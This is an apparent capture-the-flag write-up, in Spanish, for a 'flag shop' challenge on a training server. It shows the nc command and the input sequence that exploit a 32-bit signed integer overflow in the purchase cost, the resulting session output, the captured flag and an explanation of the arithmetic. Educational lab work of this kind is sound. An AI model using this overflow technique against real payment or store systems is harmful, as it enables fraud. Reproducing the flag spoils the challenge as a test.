## Descripción
There's a flag shop selling stuff, can you buy a flag? [Source](https://challenge-files.cylabacademy.net/library/a9edd9c3aadfadd003393ce86e6129100aa0d80aa289547175d0609a2c3744a1/store.c). Connect with `nc xebec.cylabacademy.net 47773`.

https://challenge-files.cylabacademy.net/library/a9edd9c3aadfadd003393ce86e6129100aa0d80aa289547175d0609a2c3744a1/store.c

## Solución
```
Dark23-academy@webshell:~$    curl -s https://challenge-files.cylabacademy.net/library/a9edd9c3aadfadd003393ce86e6129100aa0d80aa289547175d0609a2c3744a1/store.c -o store.c
Dark23-academy@webshell:~$    cat store.c


Dark23-academy@webshell:~$ printf '2\n1\n4771964\n2\n2\n1\n' | nc xebec.cylabacademy.net 47773
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
These knockoff Flags cost 900 each, enter desired quantity

The final cost is: -199696

Your current balance after transaction: 200796

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy oneYOUR FLAG IS: academy{m0n3y_bag5_E89fCE0e}

academy{m0n3y_bag5_E89fCE0e}
```
## Notas Adicionales
- `account_balance` y `total_cost` son enteros de 32 bits con signo.
- Al comprar `4771964` unidades a 900 c/u, `900 * number_flags` se desborda y se convierte en `-199696` (en vez de un número positivo gigante).
- Como `-199696 <= account_balance`, el programa ejecuta `account_balance - total_cost` = `1100 - (-199696)` = `200796` — ¡nos "regaló" dinero en vez de cobrarnos!
- Con saldo > 100,000, pudimos comprar la "1337 Flag" real, que lee `flag.txt` del servidor y lo imprime.
## Referencias
https://challenge-files.cylabacademy.net/library/a9edd9c3aadfadd003393ce86e6129100aa0d80aa289547175d0609a2c3744a1/store.c

nc xebec.cylabacademy.net 47773